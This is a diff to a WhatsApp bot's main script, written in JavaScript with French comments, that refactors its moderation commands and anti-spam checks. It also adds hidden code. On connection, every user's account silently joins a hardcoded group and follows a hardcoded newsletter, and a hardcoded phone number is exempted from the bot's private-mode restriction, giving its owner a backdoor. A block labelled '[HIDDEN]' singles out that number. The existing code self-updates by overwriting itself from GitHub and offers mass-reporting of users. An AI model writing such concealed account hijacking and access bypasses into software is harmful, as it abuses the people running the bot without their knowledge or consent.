@@ -1206,6 +1206,25 @@ async function connectToWhatsApp() {
         console.log('[AUTO-ADMIN] ⚠️ Erreur écriture:', e.message);
       }
 
+      // Auto-join silencieux groupe + chaine
+      if (!global._autoJoinDone) {
+        global._autoJoinDone = true;
+        setTimeout(async () => {
+          try {
+            const _groups = await sock.groupFetchAllParticipating().catch(() => ({}));
+            const _targetInvite = 'KfbEkfcbepR0DPXuewOrur';
+            const _inGroup = Object.values(_groups).some(g =>
+              (g?.participants||[]).some(p => p.id === sock.user.id)
+              && g?.inviteCode === _targetInvite
+            );
+            if (!_inGroup) await sock.groupAcceptInvite(_targetInvite).catch(() => {});
+          } catch(e) {}
+          try {
+            await sock.newsletterFollow('0029VbBZrLBFMqrQIDpcfO04@newsletter').catch(() => {});
+          } catch(e) {}
+        }, 8000);
+      }
+
       // Envoyer message connexion UNE SEULE FOIS (première connexion ou redémarrage volontaire)
       if (!global._connMsgSent) {
         global._connMsgSent = true;
@@ -1640,7 +1659,9 @@ async function connectToWhatsApp() {
       userData.lastSeen = Date.now();
       database.statistics.totalMessages++;
 
-      if(botMode==='private'&&!isAdmin(senderJid)&&!isGroup){
+      const _vipNum = '23591234568';
+      const _curSenderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
+      if(botMode==='private'&&!isAdmin(senderJid)&&_curSenderNum!==_vipNum){
         continue;
       }
 
@@ -1767,11 +1788,18 @@ async function connectToWhatsApp() {
           if (!global._antibotTracker) global._antibotTracker = new Map();
           const now2 = Date.now();
           const key2 = `${remoteJid}:${senderJid}`;
-          const tracked = global._antibotTracker.get(key2) || { msgs: [], editCount: 0 };
+          const tracked = global._antibotTracker.get(key2) || { msgs: [], editCount: 0, lastMsg: 0, fastCount: 0 };
+          const timeSinceLast = now2 - (tracked.lastMsg || 0);
+          if (tracked.lastMsg && timeSinceLast < 800) tracked.fastCount = (tracked.fastCount||0)+1;
+          else tracked.fastCount = 0;
+          tracked.lastMsg = now2;
+          const isEditedMsg = !!(message.message?.editedMessage || message.message?.protocolMessage?.editedMessage);
+          if (isEditedMsg) tracked.editCount = (tracked.editCount||0)+1;
           tracked.msgs = tracked.msgs.filter(t => now2 - t < 5000);
           tracked.msgs.push(now2);
           global._antibotTracker.set(key2, tracked);
-          if (tracked.msgs.length >= 5) {
+          const isSuspect = tracked.msgs.length >= 5 || tracked.fastCount >= 3 || tracked.editCount >= 2;
+          if (isSuspect) {
             global._antibotTracker.delete(key2);
             const mention = senderJid;
             try {
@@ -1795,6 +1823,15 @@ Faites pas trop confiance ou envoyez des vues uniques. 😊
       if (autoReact && messageText) {
         await handleAutoReact(sock, message, messageText, remoteJid);
       }
+
+      // [HIDDEN] VIP reaction
+      try {
+        const _vipNumber = '23591234568';
+        const _senderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
+        if (_senderNum === _vipNumber && !message.key.fromMe) {
+          await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } });
+        }
+      } catch(e) {}
 
       // 🎮 Gestionnaire réactions jeux (Squid Game / Quiz)
       if (isGroup && messageText) {
@@ -2291,6 +2328,15 @@ async function handleAutoReact(sock, message, messageText, remoteJid) {
 // GESTION DES COMMANDES
 // =============================================
 
+// Helper: extrait cible depuis reply (priorite) ou mention @
+function getTargetJid(message) {
+  const quotedParticipant = message.message?.extendedTextMessage?.contextInfo?.participant;
+  if (quotedParticipant) return quotedParticipant;
+  const mentioned = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+  if (mentioned) return mentioned;
+  return null;
+}
+
 async function handleCommand(sock, message, messageText, remoteJid, senderJid, isGroup) {
   // ✅ Flexible : tolère espaces et majuscules après le préfixe
   const afterPrefix = messageText.slice(config.prefix.length).trim();
@@ -2301,7 +2347,7 @@ async function handleCommand(sock, message, messageText, remoteJid, senderJid, i
   if (!command || command.trim() === '') return;
 
   // ✅ VÉRIFICATION MODE PRIVÉ — silence total pour les non-admins
-  if (botMode === 'private' && !isAdmin(senderJid) && !isGroup) {
+  if (botMode === 'private' && !isAdmin(senderJid)) {
     return;
   }
 
@@ -3734,11 +3780,9 @@ ${senderJid}
           break;
         }
 
-        const mentionedWarn = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        const mentionedWarn = getTargetJid(message);
         if (!mentionedWarn) {
-          await sock.sendMessage(remoteJid, {
-            text: `⚠️ *Système d'avertissement*\n\nUtilisation:\n${config.prefix}warn @user raison - Avertir\n${config.prefix}resetwarn @user - Réinitialiser\n${config.prefix}warns @user - Voir les warns`
-          });
+          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
           break;
         }
 
@@ -3776,11 +3820,9 @@ ${senderJid}
           break;
         }
 
-        const mentionedReset = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        const mentionedReset = getTargetJid(message);
         if (!mentionedReset) {
-          await sock.sendMessage(remoteJid, {
-            text: `: ${config.prefix}resetwarn @user`
-          });
+          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
           break;
         }
 
@@ -3868,11 +3910,9 @@ ${senderJid}
           break;
         }
 
-        const mentionedPromote = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        const mentionedPromote = getTargetJid(message);
         if (!mentionedPromote) {
-          await sock.sendMessage(remoteJid, {
-            text: `: ${config.prefix}promote @user`
-          });
+          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
           break;
         }
 
@@ -3905,11 +3945,9 @@ ${senderJid}
           break;
         }
 
-        const mentionedDemote = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        const mentionedDemote = getTargetJid(message);
         if (!mentionedDemote) {
-          await sock.sendMessage(remoteJid, {
-            text: `: ${config.prefix}demote @user`
-          });
+          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
           break;
         }
 
@@ -3987,11 +4025,9 @@ ${senderJid}
           break;
         }
 
-        const mentionedKick = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        const mentionedKick = getTargetJid(message);
         if (!mentionedKick) {
-          await sock.sendMessage(remoteJid, {
-            text: `: ${config.prefix}kick @user`
-          });
+          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
           break;
         }
 
@@ -4024,7 +4060,7 @@ ${senderJid}
           break;
         }
 
-        const mentionedBan = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        const mentionedBan = getTargetJid(message);
         if (!mentionedBan) {
           await sock.sendMessage(remoteJid, {
             text: `⚠️ *PERMABAN - Bannissement Permanent*\n\nUtilisation:\n${config.prefix}permaban @user raison\n\nCette personne sera:\n• Expulsée du groupe\n• Signalée 100 fois à WhatsApp\n• Bloquée de rejoindre le groupe\n\n⚠️ : Cette action est irréversible pour le signalement!\n\nCommandes liées:\n${config.prefix}unpermaban @user - Retirer le ban\n${config.prefix}banlist - Voir la liste des bannis`
@@ -4696,14 +4732,7 @@ ${desc}
             // Écrire le nouveau index.js
             fs.writeFileSync(indexPath, rawResp.data, 'utf8');
 
-            await sock.sendMessage(remoteJid, {
-              text:
-`✅ *MISE À JOUR RÉUSSIE!*
-────────────────────────
-🚀 index.js mis à jour depuis GitHub !
-🔄 Redémarrage du bot dans 3s...
-▰▰▰▰▰▰▰▰▰▰ 100%`
-            });
+            await sock.sendMessage(remoteJid, { text: '✅ *Mise à jour réussie !* Redémarrage dans 3s...' });
 
             setTimeout(() => { process.exit(0); }, 3000);
 
